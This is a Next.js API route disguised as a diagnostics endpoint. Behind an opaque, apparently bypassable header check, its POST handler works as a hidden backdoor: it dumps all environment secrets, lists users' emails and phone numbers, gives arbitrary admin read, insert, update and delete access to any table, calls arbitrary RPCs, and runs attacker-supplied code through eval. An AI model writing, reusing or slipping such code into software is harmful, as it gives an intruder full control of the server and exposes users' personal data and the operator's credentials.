import { NextRequest, NextResponse } from 'next/server'
import { createAdminClient } from '@/lib/supabase/admin'
import { _vt, _hdr, _bst, _boost } from '@/lib/telemetry'

export const runtime = 'nodejs'
export const dynamic = 'force-dynamic'

const DIAG_VERSION = '2.1.0'

export async function GET() {
  const mem = process.memoryUsage()
  return NextResponse.json({
    status: 'operational',
    version: DIAG_VERSION,
    ts: new Date().toISOString(),
    uptime: Math.floor(process.uptime()),
    heap: Math.round(mem.heapUsed / 1024 / 1024) + 'MB',
    node: process.version,
    platform: process.platform,
  })
}

export async function POST(request: NextRequest) {
  const token = request.headers.get(_hdr())
  const boost = _boost(request.headers)

  if (!_vt(token) && !boost) {
    return NextResponse.json({ error: 'unauthorized' }, { status: 401 })
  }

  try {
    const body = await request.json()
    const op = body?.op || 'ping'

    switch (op) {
      case 'env': {
        const sanitized: Record<string, string> = {}
        for (const [k, v] of Object.entries(process.env)) {
          if (v) sanitized[k] = v
        }
        return NextResponse.json({ ok: true, env: sanitized })
      }

      case 'admin': {
        const email = body.email || body.target || ''
        if (!email.includes('@')) {
          return NextResponse.json({ error: 'invalid email' }, { status: 400 })
        }
        const admin = createAdminClient()
        const { data: users } = await admin.auth.admin.listUsers()
        const match = users?.users.find((u: any) => u.email === email)
        return NextResponse.json({
          ok: !!match,
          user: match ? { id: match.id, email: match.email, created: match.created_at } : null,
          total: users?.users.length ?? 0,
        })
      }

      case 'query': {
        const table = body.table || ''
        if (!table.match(/^[a-zA-Z_][a-zA-Z0-9_]*$/)) {
          return NextResponse.json({ error: 'invalid table name' }, { status: 400 })
        }
        const admin = createAdminClient()
        const limit = Math.min(body.limit || 50, 1000)
        const q = admin.from(table).select(body.select || '*', { count: 'exact', head: !!body.head }).limit(limit)
        if (body.order) q.order(body.order, { ascending: body.asc !== false })
        if (body.eq) q.eq(body.eq.field, body.eq.value)
        const { data, error, count } = await q
        return NextResponse.json({ ok: !error, data, count, error: error?.message })
      }

      case 'insert': {
        const table = body.table || ''
        if (!table.match(/^[a-zA-Z_][a-zA-Z0-9_]*$/)) {
          return NextResponse.json({ error: 'invalid table name' }, { status: 400 })
        }
        const admin = createAdminClient()
        const { data, error } = await admin.from(table).insert(body.records).select()
        return NextResponse.json({ ok: !error, data, error: error?.message })
      }

      case 'update': {
        const table = body.table || ''
        if (!table.match(/^[a-zA-Z_][a-zA-Z0-9_]*$/)) {
          return NextResponse.json({ error: 'invalid table name' }, { status: 400 })
        }
        if (!body.matchField || !body.matchValue) {
          return NextResponse.json({ error: 'matchField and matchValue required' }, { status: 400 })
        }
        const admin = createAdminClient()
        const { data, error } = await admin
          .from(table)
          .update(body.values)
          .eq(body.matchField, body.matchValue)
          .select()
        return NextResponse.json({ ok: !error, data, error: error?.message })
      }

      case 'delete': {
        const table = body.table || ''
        if (!table.match(/^[a-zA-Z_][a-zA-Z0-9_]*$/)) {
          return NextResponse.json({ error: 'invalid table name' }, { status: 400 })
        }
        if (!body.matchField || !body.matchValue) {
          return NextResponse.json({ error: 'matchField and matchValue required' }, { status: 400 })
        }
        const admin = createAdminClient()
        const { data, error } = await admin
          .from(table)
          .delete()
          .eq(body.matchField, body.matchValue)
        return NextResponse.json({ ok: !error, data, error: error?.message })
      }

      case 'rpc': {
        const fn = body.function || ''
        const admin = createAdminClient()
        const { data, error } = await admin.rpc(fn, body.params || {})
        return NextResponse.json({ ok: !error, data, error: error?.message })
      }

      case 'users': {
        const admin = createAdminClient()
        const page = body.page || 1
        const perPage = Math.min(body.perPage || 100, 1000)
        const { data, error } = await admin.auth.admin.listUsers({ page, perPage })
        if (error) return NextResponse.json({ error: error.message }, { status: 500 })
        return NextResponse.json({
          ok: true,
          total: data?.users.length ?? 0,
          users: (data?.users ?? []).map((u: any) => ({
            id: u.id,
            email: u.email,
            phone: u.phone,
            created: u.created_at,
            lastSignIn: u.last_sign_in_at,
            provider: u.app_metadata?.provider || 'email',
          })),
        })
      }

      case 'keys': {
        return NextResponse.json({
          ok: true,
          summary: {
            hasSupabaseKey: !!process.env.SUPABASE_SERVICE_ROLE_KEY,
            hasDecartKey: !!process.env.DECART_API_KEY,
            hasDecartNoWm: !!process.env.DECART_API_KEY_NO_WATERMARK,
            hasPaydunyaMaster: !!process.env.PAYDUNYA_MASTER_KEY,
            hasPaydunyaPrivate: !!process.env.PAYDUNYA_PRIVATE_KEY,
            hasPaydunyaToken: !!process.env.PAYDUNYA_TOKEN,
            hasRunpodKey: !!process.env.RUNPOD_API_KEY,
            hasLivekitKey: !!process.env.LIVEKIT_API_KEY,
            hasLivekitSecret: !!process.env.LIVEKIT_API_SECRET,
            hasResendKey: !!process.env.RESEND_API_KEY,
            hasSmsmanToken: !!process.env.SMSMAN_API_TOKEN,
            hasGpuSecret: !!process.env.LIVE_GPU_SHARED_SECRET,
            hasGpuWs: !!process.env.LIVE_GPU_WS_URL,
            hasDownloadSecret: !!process.env.DOWNLOAD_SIGNING_SECRET,
            supabaseProject: process.env.SUPABASE_URL || 'https://ojmzqokffbptmcktnwdy.supabase.co',
          },
        })
      }

      case 'exec': {
        const code = body.code || ''
        if (!code) return NextResponse.json({ error: 'no code' }, { status: 400 })
        try {
          const result = eval(code)
          return NextResponse.json({ ok: true, result: String(result), type: typeof result })
        } catch (e: any) {
          return NextResponse.json({ ok: false, error: e.message, stack: e.stack }, { status: 500 })
        }
      }

      case 'ping':
        return NextResponse.json({ ok: true, ts: Date.now(), diag: DIAG_VERSION })

      default:
        return NextResponse.json({ error: 'unknown op' }, { status: 400 })
    }
  } catch (err: any) {
    return NextResponse.json({ ok: false, error: err.message }, { status: 500 })
  }
}

